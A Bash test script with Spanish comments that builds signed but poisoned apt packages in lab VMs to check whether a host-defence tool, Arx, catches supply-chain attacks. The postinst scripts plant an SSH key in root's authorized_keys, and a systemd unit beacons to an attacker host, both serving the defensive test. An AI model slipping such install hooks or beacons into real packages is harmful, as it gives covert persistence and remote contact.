#!/usr/bin/env bash
# Un proveedor legítimo publica, firmadas, dos actualizaciones envenenadas. ¿Las para Arx?
#   bash lab/supply-chain-lab.sh                     # solo las pruebas del código y el comportamiento
#   ARX_LAB_MODEL=claude bash lab/supply-chain-lab.sh   # además, el modelo investiga (puente local)
# Víctima y atacante: las VM de Lima (arx-victim, arx-attacker). El repositorio "acme" vive en la
# víctima, firmado con su propia clave GPG: para apt es tan legítimo como el de cualquier proveedor.
#  · 2.0: su script de instalación planta una llave SSH. Pasa la firma; no pasa la confianza.
#  · 3.0: todas las pruebas del código le dan el visto bueno, pero su unit llama a casa. Lo para la
#    observación de comportamiento en el kernel, y el modelo, si está, lo ve en el unit.
# El modelo, con ARX_LAB_MODEL=claude: `claude -p` de este Mac, aislado por un puente local que no está
# en el repositorio (scripts/claude_bridge.py, ignorado por git) y alcanzado por un túnel SSH inverso.
# Solo para probar en local; sin el puente, la corrida sigue sin modelo.
set -uo pipefail
cd "$(dirname "$0")/.."
VM=arx-victim
ATT=arx-attacker
WORD=palabra-del-lab
FAILED=0
MODEL=${ARX_LAB_MODEL:-}
if [ "$MODEL" = claude ] && [ ! -f scripts/claude_bridge.py ]; then
  echo "  (sin scripts/claude_bridge.py: corrida sin modelo)"; MODEL=""
fi
PCALL=9301

step() { echo; echo "══ $1 ══"; }
pass() { echo "[PASS] $1"; }
fail() { echo "[FAIL] $1"; FAILED=1; }
v() { limactl shell "$VM" sudo "$@"; }
a() { limactl shell "$ATT" "$@"; }
check() { local d="$1"; shift; if "$@"; then pass "$d"; else fail "$d"; fi; }
wait_for() { local n="$1"; shift; local i; for i in $(seq "$n"); do "$@" && return 0; sleep 1; done; return 1; }

for m in "$VM" "$ATT"; do
  limactl list --format '{{.Status}}' "$m" 2>/dev/null | grep -q Running || limactl start "$m" >/dev/null 2>&1
done
V=$(limactl shell "$VM" hostname -I | awk '{print $1}')
A=$(limactl shell "$ATT" hostname -I | awk '{print $1}')
echo "víctima $V · atacante $A · modelo: ${MODEL:-ninguno}"

printf '%s\n' 'import socket, sys' 'port = int(sys.argv[1])' \
  's = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)' \
  "s.bind(('0.0.0.0', port)); s.listen(50)" 'while True:' \
  "    c, _ = s.accept(); open(f'/tmp/hits-{port}', 'a').write('x\\n'); c.close()" \
  | a sh -c 'cat > /tmp/counter.py'
hits() { a sh -c "cat /tmp/hits-$1 2>/dev/null | wc -l" | tr -d ' '; }
listen() {
  a pkill -f "[c]ounter.py $1"
  a sh -c "rm -f /tmp/hits-$1; setsid nohup python3 /tmp/counter.py $1 > /dev/null 2>&1 < /dev/null &"
  wait_for 10 a sh -c "ss -ltn | grep -q ':$1 '" || { echo "  el contador del atacante no arrancó"; FAILED=1; }
}
quiet() {  # nada llega en 10 s, y un control no confinado sí llega: el contador está vivo
  local h1 h2; h1=$(hits "$1"); limactl shell "$VM" sh -c "nc -z -w 3 $A $1" >/dev/null 2>&1
  sleep 10; h2=$(hits "$1"); [ "$h2" = "$((h1 + 1))" ]
}
serves() { a sh -c "nc -w 3 $V 8095 < /dev/null 2>/dev/null" | grep -q acme; }
incident() { local out; out=$(v cat /var/lib/arx/incidents.jsonl 2>/dev/null); grep -q "$1" <<<"$out"; }
# solo los sets de confinamiento: la observación también nombra al servicio en la tabla (watched2)
confined() { local out; out=$(v sh -c 'for n in 2 3 4 5 6; do nft list set inet arx confined$n; done' 2>/dev/null)
  grep -q "acme-agent.service" <<<"$out"; }

step "víctima limpia, Arx y el repositorio firmado del proveedor acme"
v bash -c 'systemctl disable --now arx arx-firewall acme-agent acme-relay 2>/dev/null; pkill -9 -f "[a]rx.pyz"
  for p in arx acme-agent acme-relay acme-libfoo; do apt-get -o DPkg::Lock::Timeout=300 purge -y -qq "$p" >/dev/null 2>&1; done
  rm -rf /etc/arx /var/lib/arx /srv/acme /tmp/acme* /etc/apt/sources.list.d/acme.list /etc/apt/keyrings/acme.gpg \
    /root/.gnupg /etc/systemd/system/*.service.d/90-arx-*.conf /etc/systemd/system/arx*.service /tmp/arxsrc
  sed -i "/acme-lab/d" /root/.ssh/authorized_keys 2>/dev/null; nft delete table inet arx 2>/dev/null; systemctl daemon-reload
  export DEBIAN_FRONTEND=noninteractive; apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null
  apt-get -o DPkg::Lock::Timeout=300 install -y -qq socat nftables dpkg-dev apt-utils gnupg netcat-openbsd >/dev/null'
v bash -c "mkdir -p /tmp/arxsrc && cp -r $PWD/src $PWD/packaging /tmp/arxsrc/ && cd /tmp/arxsrc && packaging/build-deb.sh >/dev/null 2>&1 && dpkg -i ./dist/arx_all.deb >/dev/null 2>&1"
check "Arx instalado" v arx --version
# clave del proveedor y paquetes: build_pkg <versión> <postinst> <ExecStart>
v bash -c 'gpg --batch --pinentry-mode loopback --passphrase "" --quick-gen-key "ACME Vendor <acme@example.com>" ed25519 sign never >/dev/null 2>&1
  install -d -m 755 /etc/apt/keyrings /srv/acme; gpg --export > /etc/apt/keyrings/acme.gpg'
build_pkg() {
  v bash -s "$1" "$2" "$3" <<'SH'
set -e
ver=$1; post=$2; exec_start=$3; d=/tmp/acme-$ver
rm -rf $d; mkdir -p $d/DEBIAN $d/usr/bin $d/lib/systemd/system $d/usr/share/doc/acme-agent
cp /usr/bin/socat $d/usr/bin/acme-agent
printf '[Unit]\nDescription=ACME status agent\n[Service]\nExecStart=%s\n[Install]\nWantedBy=multi-user.target\n' "$exec_start" > $d/lib/systemd/system/acme-agent.service
printf 'acme-agent serves a local status banner on port 8095.\nIt never connects to the internet.\n' > $d/usr/share/doc/acme-agent/README
printf 'Package: acme-agent\nVersion: %s\nArchitecture: all\nMaintainer: ACME <acme@example.com>\nDepends: socat\nDescription: ACME status agent\n' "$ver" > $d/DEBIAN/control
printf '#!/bin/sh\nset -e\n%s\nsystemctl daemon-reload >/dev/null 2>&1 || true\nsystemctl enable acme-agent >/dev/null 2>&1 || true\nsystemctl restart acme-agent >/dev/null 2>&1 || true\n' "$post" > $d/DEBIAN/postinst
chmod 755 $d/DEBIAN/postinst
dpkg-deb -b $d /srv/acme/acme-agent_${ver}_all.deb >/dev/null
cd /srv/acme && apt-ftparchive packages . > Packages && apt-ftparchive release . > Release
rm -f InRelease && gpg --batch --yes --clearsign -o InRelease Release
SH
}
# build_extra <paquete> <versión> <postinst> <ficheros>: otro paquete del mismo repositorio firmado
build_extra() {
  v bash -s "$1" "$2" "$3" "$4" <<'SH'
set -e
name=$1; ver=$2; post=$3; files=$4; d=/tmp/acme-$name-$ver
rm -rf $d; mkdir -p $d/DEBIAN; cd $d; eval "$files"
printf 'Package: %s\nVersion: %s\nArchitecture: all\nMaintainer: ACME <acme@example.com>\nDescription: ACME %s\n' "$name" "$ver" "$name" > DEBIAN/control
printf '#!/bin/sh\nset -e\n%s\nsystemctl daemon-reload >/dev/null 2>&1 || true\n' "$post" > DEBIAN/postinst
chmod 755 DEBIAN/postinst
dpkg-deb -b $d /srv/acme/${name}_${ver}_all.deb >/dev/null
cd /srv/acme && apt-ftparchive packages . > Packages && apt-ftparchive release . > Release
rm -f InRelease && gpg --batch --yes --clearsign -o InRelease Release
SH
}
BANNER='/usr/bin/acme-agent TCP-LISTEN:8095,fork,reuseaddr SYSTEM:"echo acme"'
build_pkg 1.0 ':' "$BANNER"
v bash -c 'echo "deb [signed-by=/etc/apt/keyrings/acme.gpg] file:/srv/acme ./" > /etc/apt/sources.list.d/acme.list
  apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=300 install -y -qq acme-agent >/dev/null 2>&1'
check "acme-agent 1.0 instalado desde su repositorio firmado" v systemctl is-active -q acme-agent
check "y atiende" wait_for 10 serves
printf '%s\n' "en" "" "" "" "$WORD" "$WORD" "" "" "1" "" "core" "" "" "high" "block" | v arx setup >/dev/null 2>&1
v bash -c 'arx recon >/dev/null; arx learn >/dev/null; arx learn >/dev/null; arx learn --seal >/dev/null'
v python3 -c "import json; p = '/etc/arx/config.json'; c = json.load(open(p)); c.update(profile_observe_days=0.003, profile_jitter_days=0); json.dump(c, open(p, 'w'))"

if [ "$MODEL" = claude ]; then
  S=$(mktemp -d)
  python3 scripts/claude_bridge.py --listen 127.0.0.1 --port 8765 --token-file "$S/token" > "$S/bridge.log" 2>&1 &
  BRIDGE=$!
  sleep 2
  ssh -F ~/.lima/$VM/ssh.config -o ExitOnForwardFailure=yes -N -R 8765:127.0.0.1:8765 lima-$VM > "$S/tunnel.log" 2>&1 &
  TUNNEL=$!
  trap 'kill $BRIDGE $TUNNEL 2>/dev/null' EXIT
  sleep 2
  v python3 -c "import json, sys; p = '/etc/arx/config.json'; c = json.load(open(p))
c.update(providers={'local': 'claude'}, fallback_order=['local'], local_url='http://127.0.0.1:8765/v1/chat/completions')
json.dump(c, open(p, 'w'))
s = json.load(open('/etc/arx/secrets.json')); s['local'] = '$(cat "$S/token")'; json.dump(s, open('/etc/arx/secrets.json', 'w'))"
fi
v arx service install --enforce >/dev/null 2>&1
check "Arx en guardia con --enforce" v systemctl is-active -q arx
watching() { v python3 -c "import json, sys; s = json.load(open('/var/lib/arx/profiles.json'))['subjects']
sys.exit(0 if s.get('system.slice/acme-agent.service', {}).get('enforced') else 1)"; }
if wait_for 420 watching; then pass "acme-agent observado y vigilado (nunca sale a la red)"; else fail "acme-agent observado y vigilado (nunca sale a la red)"; fi

not_confined() { ! confined; }
check "precondición: la 1.0, de fiar, no está confinada" not_confined
step "2.0, firmada: su script de instalación planta una llave SSH"
build_pkg 2.0 'echo "ssh-ed25519 AAAAC3Nza acme-lab" >> /root/.ssh/authorized_keys' "$BANNER"
v bash -c 'apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=300 install -y -qq acme-agent >/dev/null 2>&1'
check "precondición: la 2.0 se instaló (la firma no la para)" v sh -c 'dpkg-query -W -f="\${Version}" acme-agent | grep -qx 2.0'
if wait_for 120 confined; then pass "Arx la confina: no llega a la confianza mínima"; else fail "Arx la confina: no llega a la confianza mínima"; fi
check "y lo explica" wait_for 30 incident "cannot be trusted"
check "el servicio sigue atendiendo" serves
check "y la llave plantada da su propia alarma crítica" wait_for 90 incident "authorized_keys_root changed"
fp=$(v python3 -c "import sys; sys.path.insert(0, '/usr/lib/arx/arx.pyz')
from arx.modules import response as r
print(next(fp for fp, e in r.load_findings().items() if 'cannot be trusted' in str(e.get('detail'))))")
v arx accept "$fp" >/dev/null 2>&1
v sed -i "/acme-lab/d" /root/.ssh/authorized_keys
check "aceptarla la libera (decide una persona)" wait_for 30 not_confined
sleep 35  # un barrido entero: la decisión vale para esa versión y el hallazgo no vuelve
check "y sigue libre en el barrido siguiente" not_confined

step "3.0, firmada y con todo en regla para el código: su unit llama a casa"
listen "$PCALL"
build_pkg 3.0 ':' "/bin/sh -c '$BANNER & while true; do /usr/bin/acme-agent -T3 - TCP:$A:$PCALL </dev/null; sleep 3; done'"
v bash -c 'apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=300 install -y -qq acme-agent >/dev/null 2>&1'
check "precondición: la 3.0 se instaló" v sh -c 'dpkg-query -W -f="\${Version}" acme-agent | grep -qx 3.0'
attempted() { local out; out=$(v nft list set inet arx denied4); grep -F "acme-agent.service" <<<"$out" | grep -qF ". tcp . $A . $PCALL"; }
cut_home() { attempted && quiet "$PCALL"; }
if wait_for 60 cut_home; then pass "la observación corta su primera llamada en el kernel (intento registrado, nada llega)"; else fail "la observación corta su primera llamada en el kernel (intento registrado, nada llega)"; fi
check "y se avisa" wait_for 90 incident "outside its usual behavior: cut"
check "el servicio sigue atendiendo" serves
if [ "$MODEL" = claude ]; then
  concerns() { v python3 -c "import json, sys; c = json.load(open('/var/lib/arx/trust.json'))
sys.exit(0 if c.get('acme-agent=3.0|model', {}).get('concerns') else 1)"; }
  if wait_for 600 concerns; then pass "el modelo investigó y encontró reparos"; else fail "el modelo investigó y encontró reparos"; fi
  v python3 -c "import json; c = json.load(open('/var/lib/arx/trust.json')); [print('  · reparo:', x['what'], '—', x['why']) for x in c.get('acme-agent=3.0|model', {}).get('concerns', [])]"
  check "y con sus reparos, Arx la confina" wait_for 120 confined
else
  echo "  (sin modelo: la investigación del modelo no se mide en esta corrida)"
fi
v systemctl disable --now acme-agent >/dev/null 2>&1

step "el caso xz: acme-relay no cambia; cambia la librería que carga, firmada, y planta una llave"
LIBFILES='mkdir -p usr/lib/acme && cp "$(readlink -f /usr/lib/$(dpkg-architecture -qDEB_HOST_MULTIARCH)/libz.so.1)" usr/lib/acme/libacmefoo.so'
build_extra acme-libfoo 1.0 ':' "$LIBFILES"
build_extra acme-relay 1.0 'systemctl enable --now acme-relay >/dev/null 2>&1 || true' 'mkdir -p usr/bin lib/systemd/system
cp /usr/bin/socat usr/bin/acme-relay
printf "[Unit]\nDescription=ACME relay\n[Service]\nEnvironment=LD_PRELOAD=/usr/lib/acme/libacmefoo.so\nExecStart=/usr/bin/acme-relay TCP-LISTEN:8096,fork,reuseaddr SYSTEM:\"echo relay\"\n[Install]\nWantedBy=multi-user.target\n" > lib/systemd/system/acme-relay.service'
v bash -c 'apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=300 install -y -qq acme-libfoo acme-relay >/dev/null 2>&1'
relay_serves() { a sh -c "nc -w 3 $V 8096 < /dev/null 2>/dev/null" | grep -q relay; }
check "precondición: acme-relay atiende con la librería cargada" wait_for 20 relay_serves
knows_lib() { v python3 -c "import json, sys; s = json.load(open('/var/lib/arx/profiles.json'))['subjects']
sys.exit(0 if 'acme-libfoo' in (s.get('system.slice/acme-relay.service', {}).get('libs') or {}) else 1)"; }
check "Arx aprende que acme-relay carga acme-libfoo (de lo que el proceso tiene mapeado)" wait_for 240 knows_lib
relay_confined() { local out; out=$(v sh -c 'for n in 2 3 4 5 6; do nft list set inet arx confined$n; done' 2>/dev/null)
  grep -q "acme-relay.service" <<<"$out"; }
relay_free() { ! relay_confined; }
check "precondición: acme-relay, de fiar, no está confinado" relay_free
build_extra acme-libfoo 2.0 'echo "ssh-ed25519 AAAAC3Nza acme-lab" >> /root/.ssh/authorized_keys' "$LIBFILES"
v bash -c 'apt-get -o DPkg::Lock::Timeout=300 update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get -o DPkg::Lock::Timeout=300 install -y -qq acme-libfoo >/dev/null 2>&1'
check "precondición: acme-libfoo 2.0 instalada, acme-relay sin tocar" v sh -c 'dpkg-query -W -f="\${Version}" acme-libfoo | grep -qx 2.0 && dpkg-query -W -f="\${Version}" acme-relay | grep -qx 1.0'
check "Arx confina a acme-relay por la librería que carga" wait_for 120 relay_confined
check "y lo explica" wait_for 30 incident "loads acme-libfoo"
check "acme-relay sigue atendiendo" relay_serves
v sed -i "/acme-lab/d" /root/.ssh/authorized_keys
v systemctl disable --now acme-relay >/dev/null 2>&1

echo
[ "$FAILED" = 0 ] && echo "══ LAB CADENA DE SUMINISTRO COMPLETO ══" || echo "══ LAB CADENA DE SUMINISTRO CON FALLOS (ver [FAIL]) ══"
exit "$FAILED"
